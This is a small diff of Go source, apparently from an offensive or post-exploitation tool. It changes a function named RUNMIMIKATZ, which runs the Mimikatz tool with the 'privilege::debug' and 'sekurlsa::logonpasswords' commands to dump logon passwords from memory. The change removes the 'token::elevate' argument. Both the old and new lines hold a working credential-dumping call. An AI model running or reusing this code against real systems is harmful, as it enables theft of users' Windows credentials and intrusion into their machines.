@@ -61,7 +61,7 @@ func RUNMIMIKATZ() {
 	if err != nil {
 		fmt.Println(err)
 	}
-	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "token::elevate", "sekurlsa::logonpasswords", "exit").Output()
+	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
 	if err != nil {
 		fmt.Println(err)
 	}
